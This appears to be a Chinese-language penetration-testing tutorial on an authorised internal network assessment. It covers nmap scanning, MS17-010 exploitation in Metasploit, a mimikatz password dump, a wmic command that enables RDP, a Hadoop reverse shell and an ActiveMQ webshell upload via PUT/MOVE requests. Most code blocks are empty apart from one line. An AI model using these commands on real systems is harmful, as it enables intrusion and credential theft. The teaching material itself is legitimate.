场景：

客户要求你对他们内网做一次安全评估，你接了这个活，搞清楚客户需求：（不影响业务，不限制攻击手段，目标是获取服务器权限），给了你一个IP段：10.211.55.1/24

  

## 渗透测试授权

须和客户签订渗透测试授权书并盖客户公章。

## 渗透测试流程

### 信息收集

需要对你的渗透测试环境网络进行配置

### 探测存活主机

### Nmap

```































(base) ➜  ~ Nmap -Pn 10.211.55.1/24
```

经过探测发现该IP段有3个存活主机

分别是：10.211.55.5、10.211.55.6、10.211.55.8

对这三个主机进行全端口扫描，查看三台主机开放端口情况

  

10.211.55.5

```







































(base) ➜  ~ sudo nmap -sS -p 1-65535 -v 10.211.55.5
```

通过端口开放情况可判断该主机为Windows操作系统，查看主机操作系统版本

```


















(base) ➜  ~ sudo nmap -O 10.211.55.5
```

10.211.55.6

端口扫描

```
























(base) ➜  ~ sudo nmap -sS -p 1-65535 -v 10.211.55.6
```

操作系统识别

```

























(base) ➜  ~ sudo nmap -O 10.211.55.6               
```

10.211.55.8

端口扫描

```


































(base) ➜  ~ sudo nmap -sS -p 1-65535 -v 10.211.55.8
```

操作系统识别

```
sudo nmap -O 10.211.55.8
```

## 漏洞利用

经过前期信息收集，可得出以下判断

10.211.55.5和10.211.55.8均为Windows操作系统。

Windows操作系统开放了

```
























10.211.55.5
```

在做渗透测试的时候，一个shell对话只做一类事，端口扫描的shell不要用来做漏洞检测和利用。方便把日志导出为文本交给客户。

根据开放的445端口可初步确定存在MS17-010永恒之蓝漏洞

对漏洞进行验证和利用，使用Metasploit里对payload进行验证。

![](../Images/03e5d2dae2caa999135e91b559a323cb.png)

经过验证，10.211.55.8存在ms17-010漏洞，使用exploit进行攻击。

```



































msf5 exploit(windows/smb/ms17_010_eternalblue) > set rhosts 10.211.55.8
```

![](../Images/ab2b19de1c414afd605b2a6eb05889f8.png)

抓取目标主机的账号登录密码：

```




















C:\Windows\system32>ipconfig    
```

![](../Images/8bbd4a06c75e5fe8ec26fe0bfa95d31a.png)

```














































C:\Windows\system32>systeminfo
```

![](../Images/eefd4538554e8b493a022997fdbc4ada.png)

经过对目标主机信息收集，发现目标主机系统为64位，上传64位mimikatz.exe进行密码抓取。

```




































































































































mimikatz # sekurlsa::logonPasswords
```

![](../Images/58711d588080ff358e0a019f54339adf.png)

前期信息收集发现3389端口没开，无法进行登录操作，使用命令进行3389端口开放操作。

```
wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1
```

我们使用Nmap再次进行端口探测，可发现3389端口成功开启。

```

























(base) ➜  ~ sudo nmap -O 10.211.55.8
```

3389端口开启成功之后利用抓取到的密码进行远程登录操作。

![](../Images/d03632e0f19d06397d29196514e77ce4.png)![](../Images/8d14ce25a44e062cd68062b375bfe2ff.png)

成功登录Windows7SP1操作系统。

10.211.55.6为Ubuntu Linux

开放的端口为：

```




PORT      STATE SERVICE
```

开放8088端口，Web应用，使用浏览器打开发现Hadoop未授权访问。

![](../Images/c5fe8c12eccd84c4191b271483ee80f7.png)

可以利用Hadoop未授权访问获取服务器权限。

反弹shell的exploit

```


















import requests
```

监听8888端口

```



























(base) ➜  ~ nc -l 8888
```

![](../Images/ed1aa65d93fc596d1822c4117b1e47ed.png)

获取到Ubuntu Linux服务器权限

主机开放了8161端口，使用浏览器打开发现为ActiveMQ组件，存在任意文件写入漏洞。

```









PUT /fileserver/1.txt HTTP/1.1
```

![](../Images/ff599f34e9da941095bcd0dd364d689f.png)

使用BurpSuite对网页数据进行抓包，改动数据包写马重放数据包，204表示成功。

![](../Images/baa7f7d247910f685f7c006f1e7f4181.png)

将上传的马进行文件移动操作

```









MOVE /fileserver/1.txt HTTP/1.1 
```

监听端口等待shell反弹即可。
